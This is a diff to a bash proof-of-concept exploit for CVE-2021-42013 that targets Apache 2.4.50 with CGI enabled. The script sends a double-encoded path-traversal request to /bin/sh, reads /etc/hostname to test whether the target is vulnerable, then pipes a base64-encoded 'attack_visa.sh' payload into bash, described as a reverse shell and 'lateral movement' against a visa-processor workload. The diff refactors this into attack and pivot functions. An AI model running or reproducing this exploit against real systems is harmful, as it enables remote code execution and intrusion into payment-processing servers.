@@ -10,7 +10,7 @@
 #!/bin/bash
 
 #attach visa deployment
-inject=$(cat templates/attack_visa.sh | base64)
+inject=$(cat $(dirname -- "$0")/templates/attack_visa.sh | base64)
 
 echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'
 if [ $# -eq 0 ]
@@ -18,4 +18,21 @@ then
 echo  "try: ./$0 http://ip:port"
 exit 1
 fi
-curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; echo '${inject}' | base64 -d | bash -"
+#curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; echo '${inject}' | base64 -d | bash -"
+
+function curl_target(){
+curl -s "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $2"
+}
+
+function attack(){
+export hostname=$(curl_target $1 "cat /etc/hostname")
+echo $hostname | grep -q "<html>" && echo '☹ - Target not Vulnerable' && exit || echo "☺ - Target ${hostname} Exploited" && pivot $1 || echo '☹ - Exploit FAILED'
+}
+
+function pivot(){
+echo "☺ - Next Phase: Lateral Movement ..."
+echo "☺ - Exploiting visa-processor workload ..."
+curl_target $1 "echo '${inject}' | base64 -d | bash -"
+}
+
+attack $1
